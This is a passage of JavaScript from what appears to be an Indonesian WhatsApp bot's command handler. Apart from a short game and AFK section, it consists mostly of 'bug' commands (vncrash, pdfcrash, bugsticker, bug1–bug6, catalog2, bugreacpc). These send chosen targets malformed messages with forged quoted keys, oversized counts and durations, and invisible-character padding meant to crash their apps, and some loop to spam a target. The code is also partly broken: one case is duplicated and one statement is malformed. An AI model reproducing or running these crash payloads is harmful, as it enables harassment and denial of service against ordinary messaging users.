let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
bangkal(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
bangkal(`
𝐂𝐑𝚫𝐒𝐇 𝐇𝐎𝐌𝚵${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
case 'catalogc': {
if (!isCreator) return
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${cttl}`,
"description": `${cttl}`,
"bodyText": `${bd}${buttonvirus}`,
"footerText": `${ft}`,
"productImageCount": 946735786,
"firstImageId": 1,
"retailerId": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"url": "wa.me/6283844775996"
},
"businessOwnerJid": "6283844775996@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'catalog': {
if (!isCreator) return
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`,
"description": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"currencyCode": "IDR",
"footerText": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"url": "wa.me/6283844775996"
},
"businessOwnerJid": "6283844775996@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'catalog+': {
if (!isCreator) return
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${cttl}`,
"description": `${cttl}`,
"currencyCode": "IDR",
"bodyText": `${bd}${buttonvirus}`,
"footerText": `${ft}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"url": "wa.me/6283844775996"
},
"businessOwnerJid": "6283844775996@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'catalog2': {
if (args.length < 1) return bangkal(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`,
"description": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"currencyCode": "IDR",
"footerText": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"url": "wa.me/6283844775996"
},
"businessOwnerJid": "6283844775996@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: trol  })
haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
bangkal(tekteka)
}
break
//=================================================//
/*BUG WACAP */
break
case 'bugsticker': {
if (!isCreator) return
if (args.length < 1) return bangkal(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1] 
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync('./lib/pict.jpg'),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"orderTitle": "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ",
"sellerJid": "6283844775996@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
            } 
        } 
    }
 hey = fs.readFileSync('anjas.webp')
, { userJid: m.chat, quoted: trol  }
haikal.sendImageAsSticker(num, hey, adehvn, { packname: global.packname, author: global.author })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
bangkal(tekteka)
}
break
case 'vncrash':
if (!isCreator) throw mess.owner
if (!text) throw `MASUKAN NOMOR TARGET`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
"locationMessage": {}
            } 
        } 
 hey = fs.readFileSync('chan.mp3')
 haikal.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break

case 'fotoc':
if (!isCreator) throw mess.owner
if (!text) throw `MASUKAN NOMOR TARGET`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
 hey = fs.readFileSync('zy.jpg')
 haikal.sendMessage(`${text}@s.whatsapp.net`, {image: hey, adehvn, }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break

case 'virvidc':
if (!isCreator) throw mess.owner
if (!text) throw `MASUKAN NOMOR TARGET`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
 hey = fs.readFileSync('gif.mp4')
 haikal.sendMessage(`${text}@s.whatsapp.net`, {video: hey, adehvn, }, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break

case 'pdfcrash':
if (!isCreator) throw mess.owner
if (!text) throw `MASUKAN NOMOR TARGET`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${ngazap(prefix)}`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('gg.pdf')
 haikal.sendMessage(`${text}@s.whatsapp.net`, {document: hey, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: adehvn})
await m.reply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
break

//=================================================//
/*BUG WACAP */
case 'bugreacpc' : {
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
/*BUG WACAP */
case 'bugreacpc' : {
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ"}, {quoted: a})
await sleep(10000)
haikal.sendMessage(Pe, {text: "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
case 'crash': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
bangkal(`${m.pushName} ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bug1': {
if(!m.key.fromMe) return
if (!isCreator) return
var main = {
  "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
  },
  "message":{
"imageMessage":{
  "mimetype":"image/jpeg",
  "jpegThumbnail":fs.readFileSync('./lib/pict.jpg')
}
  }
}
reply(m.chat, `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug2': {
if(!m.key.fromMe) return
if (!isCreator) return
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
"locationMessage": {}
   }
}
hwmods(m.chat, `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug3': {
if(!m.key.fromMe) return
if (!isCreator) return
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync('./lib/pict.jpg'),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"orderTitle": "ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ",
"sellerJid": "6283844775996@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
  }
   }
}
review(m.chat, `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug4': {
if(!m.key.fromMe) return
if (!isCreator) return
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 99999,
"caption": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
  }
   }
}
hwbro(m.chat, `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug5': {
if(!m.key.fromMe) return
if (!isCreator) return
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "groupInviteMessage": {
"groupJid": "120363025461390219@g.us",
"inviteCode": "z0JcSBd3mAhIfSSY",
"inviteExpiration": ` ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`,
"groupName": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ ${ngazap(prefix)}`,
"caption": `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`
 }
   }
}
bacit(m.chat, `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ`, main)
}
break
//=================================================//
case 'bug6': {
if(!m.key.fromMe) return
if (!isCreator) return
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "contactMessage": {
"displayName": "🔥 ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ 🔥‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎